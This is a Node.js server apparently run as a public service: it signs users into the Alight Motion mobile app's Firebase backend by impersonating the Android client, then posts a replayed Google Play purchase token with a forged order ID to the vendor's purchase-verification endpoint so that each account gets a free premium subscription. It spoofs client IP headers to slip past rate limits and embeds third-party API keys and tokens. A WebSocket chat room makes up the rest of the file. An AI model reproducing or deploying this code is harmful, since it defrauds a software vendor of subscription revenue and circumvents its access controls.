/**
 * Astacloud — Backend + WebSocket Public Chat
 */

const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const http = require('http');
const { WebSocketServer } = require('ws');

const app = express();
const PORT = process.env.PORT || 3000;

app.set('trust proxy', 1);
app.use(cors());
app.use(express.json({ limit: '2mb' }));
app.use(express.static(path.join(__dirname, 'public')));

// ====== RATE LIMITERS ======
const globalLimiter = rateLimit({
    windowMs: 60 * 1000, max: 60,
    standardHeaders: true, legacyHeaders: false,
    message: { ok: false, why: 'Terlalu banyak request. Coba lagi sebentar 🌸' }
});

const sendLimiter = rateLimit({
    windowMs: 5 * 60 * 1000, max: 5,
    standardHeaders: true, legacyHeaders: false,
    keyGenerator: (req) => `${req.ip}::${(req.body?.email || '').toLowerCase().trim()}`,
    message: { ok: false, why: 'Sudah kirim link beberapa kali. Tunggu 5 menit ya 🪸' }
});

const verifyLimiter = rateLimit({
    windowMs: 5 * 60 * 1000, max: 8,
    standardHeaders: true, legacyHeaders: false,
    keyGenerator: (req) => `${req.ip}::${(req.body?.email || '').toLowerCase().trim()}`,
    message: { ok: false, why: 'Terlalu banyak percobaan verifikasi. Coba 5 menit lagi 🌸' }
});

app.use('/api/', globalLimiter);

// Cooldown per-email
const emailCooldown = new Map();
const COOLDOWN_MS = 60 * 1000;
function checkEmailCooldown(email) {
    const now = Date.now();
    const last = emailCooldown.get(email);
    if (last && now - last < COOLDOWN_MS) {
        return { ok: false, sisa: Math.ceil((COOLDOWN_MS - (now - last)) / 1000) };
    }
    emailCooldown.set(email, now);
    setTimeout(() => {
        const t = emailCooldown.get(email);
        if (t && Date.now() - t >= COOLDOWN_MS) emailCooldown.delete(email);
    }, COOLDOWN_MS + 1000);
    return { ok: true };
}

// ====== AM PREMIUM CONFIG ======
const cfg = {
    key: 'AIzaSyDtG1AU22ErnQD60AzBAcaknySiz9_CEq0',
    idt: 'https://www.googleapis.com/identitytoolkit/v3/relyingparty',
    stk: 'https://securetoken.googleapis.com/v1/token',
    vfy: 'https://us-central1-alight-creative.cloudfunctions.net/verifyPurchase'
};

const dip = () => [crypto.randomInt(1,255), crypto.randomInt(0,255), crypto.randomInt(0,255), crypto.randomInt(1,255)].join('.');
const sp = (h) => ({ ...h, 'x-forwarded-for': dip(), 'x-real-ip': dip(), 'client-ip': dip(), 'x-client-ip': dip(), 'x-originating-ip': dip(), 'x-cluster-client-ip': dip() });

const h1 = {
    'content-type': 'application/json',
    'x-android-package': 'com.alightcreative.motion',
    'x-android-cert': 'ECA6BF91B8715A6F810ED0BBFC65B6CD578F52A8',
    'user-agent': 'dalvik/2.1.0 (linux; u; android 15; 23127pn0cc build/bp1a.250505.005)'
};
const h2 = {
    'content-type': 'application/json; charset=utf-8',
    'user-agent': 'okhttp/3.12.1',
    'accept-encoding': 'gzip'
};

const bad = (e) => {
    const d = e.response?.data;
    return d ? (typeof d === 'object' ? JSON.stringify(d) : String(d)) : e.message;
};

async function link(email) {
    const c1 = { identifier: email, continueUri: 'http://localhost' };
    const c2 = {
        requestType: 6, email,
        androidInstallApp: true, canHandleCodeInApp: true,
        continueUrl: 'https://alightcreative.com?ui_sid=0366624874&ui_sd=0',
        iosBundleId: 'com.alightcreative.motion',
        androidPackageName: 'com.alightcreative.motion',
        androidMinimumVersion: '585',
        clientType: 'CLIENT_TYPE_ANDROID'
    };
    try {
        await axios.post(`${cfg.idt}/createAuthUri?key=${cfg.key}`, c1, { headers: sp(h1), timeout: 15000 });
        const r = await axios.post(`${cfg.idt}/getOobConfirmationCode?key=${cfg.key}`, c2, { headers: sp(h1), timeout: 15000 });
        return { ok: true, data: r.data };
    } catch (e) { return { ok: false, why: bad(e) }; }
}

function code(raw) {
    if (!raw) return null;
    let s = String(raw).replace(/&/g, '&');
    try { s = decodeURIComponent(s); } catch {}
    try {
        const u = new URL(s);
        let c = u.searchParams.get('oobCode');
        if (!c) {
            const n = u.searchParams.get('link') || u.searchParams.get('q') || u.searchParams.get('url');
            if (n) { try { c = new URL(n).searchParams.get('oobCode'); } catch {} }
        }
        if (c) return c.replace(/[^a-zA-Z0-9_-]/g, '');
    } catch {}
    const m = s.match(/oobCode=([a-zA-Z0-9_-]+)/i);
    if (m) return m[1];
    const t = raw.trim();
    if (/^[a-zA-Z0-9_-]{10,}$/.test(t) && !t.includes('://')) return t;
    return null;
}

async function auth(email, raw) {
    const c = code(raw);
    if (!c) return { ok: false, why: 'Code tidak ditemukan di link' };
    try {
        const a = await axios.post(`${cfg.idt}/emailLinkSignin?key=${cfg.key}`, {
            email, oobCode: c, clientType: 'CLIENT_TYPE_ANDROID'
        }, { headers: sp(h1), timeout: 15000 });
        let u = null;
        try {
            const b = await axios.post(`${cfg.idt}/getAccountInfo?key=${cfg.key}`, { idToken: a.data.idToken }, { headers: sp(h1), timeout: 15000 });
            u = b.data?.users?.[0] || null;
        } catch {}
        return { ok: true, email, id: a.data.idToken, ref: a.data.refreshToken, uid: a.data.localId, baru: !!a.data.isNewUser, user: u };
    } catch (e) { return { ok: false, why: bad(e) }; }
}

async function pro(id) {
    const o = 'asta-' + crypto.randomBytes(4).toString('hex').toUpperCase();
    const b = {
        data: {
            productId: 'am.full.sub.annual.19q4',
            token: 'mmgaobamlahbbeccfplmbkbb.AO-J1OzqG0or_GJJIx-ms8GrTm-jaglCRfhQSRPUZKpl2YspYS-oN7_94uv8RC5vQbvd_Ios2pPDStZ2n7F0hLE3FiOU7HS3R6Fquulv5xLXFECSv4ctElw',
            skuType: 'subs',
            orderId: o
        }
    };
    const h = {
        ...h2,
        authorization: 'Bearer ' + id,
        'firebase-instance-id-token': 'cSDnCyp3T-uwp07z3tL86T:APA91bFkmvvsHw5nnqa1SBFci-99DRsKClLiETdRrVcJjS5yBx1v_FbCb1d8WhBuea_zmwnYBktyTIzcRhN4b6uNOUur9wPc0gKXmJDoZic0LhNq5V2s0xI'
    };
    try {
        const r = await axios.post(cfg.vfy, b, { headers: sp(h), timeout: 20000 });
        return { ok: true, order: o, data: r.data };
    } catch (e) { return { ok: false, why: bad(e) }; }
}

// ====== API ROUTES ======
app.post('/api/send', sendLimiter, async (req, res) => {
    const { email } = req.body || {};
    if (!email || !/@/.test(email)) return res.status(400).json({ ok: false, why: 'Email tidak valid' });

    const clean = email.trim().toLowerCase();
    const cd = checkEmailCooldown(clean);
    if (!cd.ok) return res.status(429).json({ ok: false, why: `Tunggu ${cd.sisa} detik lagi ya 🌸` });

    const r = await link(clean);
    if (!r.ok) return res.status(500).json(r);
    res.json({ ok: true, email: clean, msg: 'Link verifikasi terkirim' });
});

app.post('/api/verify', verifyLimiter, async (req, res) => {
    const { email, link: linkUrl } = req.body || {};
    if (!email || !/@/.test(email)) return res.status(400).json({ ok: false, why: 'Email tidak valid' });
    if (!linkUrl || linkUrl.trim().length < 5) return res.status(400).json({ ok: false, why: 'Link verifikasi kosong' });

    const v = await auth(email.trim(), linkUrl.trim());
    if (!v.ok) return res.status(400).json(v);

    const q = await pro(v.id);
    if (!q.ok) return res.status(500).json({ ok: false, why: q.why, step: 'promote' });

    res.json({ ok: true, email: v.email, uid: v.uid, baru: v.baru, order: q.order, status: 'Active' });
});

app.get('/api/health', (_, res) => res.json({ ok: true, ts: Date.now(), online: clients.size }));

// ====== HTTP + WS SERVER ======
const server = http.createServer(app);
const wss = new WebSocketServer({ server, path: '/ws' });

const chatHistory = [];
const MAX_HISTORY = 100;
const clients = new Map(); // ws -> { user, msgTimes }

function broadcast(data, exclude) {
    const str = JSON.stringify(data);
    for (const [c] of clients) {
        if (c !== exclude && c.readyState === 1) {
            try { c.send(str); } catch {}
        }
    }
}
function send(ws, data) {
    if (ws.readyState === 1) {
        try { ws.send(JSON.stringify(data)); } catch {}
    }
}
function onlineList() {
    return Array.from(clients.values()).map(c => c.user).filter(Boolean);
}

wss.on('connection', (ws) => {
    clients.set(ws, { user: null, msgTimes: [] });
    send(ws, { type: 'history', messages: chatHistory });
    send(ws, { type: 'online', count: clients.size, users: onlineList() });

    ws.on('message', (raw) => {
        let data;
        try { data = JSON.parse(raw.toString()); } catch { return; }
        const meta = clients.get(ws);
        if (!meta) return;

        // Anti-spam: max 5 pesan / 3 detik
        const now = Date.now();
        meta.msgTimes = meta.msgTimes.filter(t => now - t < 3000);
        if (meta.msgTimes.length >= 5) {
            send(ws, { type: 'error', why: 'Terlalu cepat, santai dulu ya 🌸' });
            return;
        }

        if (data.type === 'join') {
            const name = String(data.user || '').trim().substring(0, 20);
            if (!name) return;
            const taken = Array.from(clients.values()).some(c =>
                c !== meta && c.user && c.user.toLowerCase() === name.toLowerCase()
            );
            if (taken) {
                send(ws, { type: 'error', why: 'Nama sudah dipakai orang lain, pilih yang lain!' });
                return;
            }
            meta.user = name;
            send(ws, { type: 'joined', user: name });
            broadcast({ type: 'join', user: name, count: clients.size, users: onlineList() }, ws);
            return;
        }

        if (data.type === 'message') {
            if (!meta.user) return;
            const text = String(data.text || '').trim().substring(0, 500);
            if (!text) return;
            meta.msgTimes.push(now);

            const msg = {
                type: 'message',
                user: meta.user,
                text,
                time: data.time || new Date().toTimeString().slice(0, 5),
                reply: data.reply && data.reply.name ? {
                    name: String(data.reply.name).substring(0, 20),
                    text: String(data.reply.text).substring(0, 100)
                } : null,
                ts: now
            };
            chatHistory.push(msg);
            if (chatHistory.length > MAX_HISTORY) chatHistory.shift();
            broadcast(msg); 
            return;
        }
    });

    ws.on('close', () => {
        const meta = clients.get(ws);
        clients.delete(ws);
        if (meta?.user) {
            broadcast({ type: 'leave', user: meta.user, count: clients.size, users: onlineList() });
        }
    });

    ws.on('error', () => {});
});

// Keep-alive ping
setInterval(() => {
    for (const [ws] of clients) {
        if (ws.readyState === 1) { try { ws.ping(); } catch {} }
    }
}, 30000);

// Fallback → index.html
app.get('*', (_, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));

server.listen(PORT, () => {
    console.log(`🌸 Astacloud running at http://localhost:${PORT}`);
});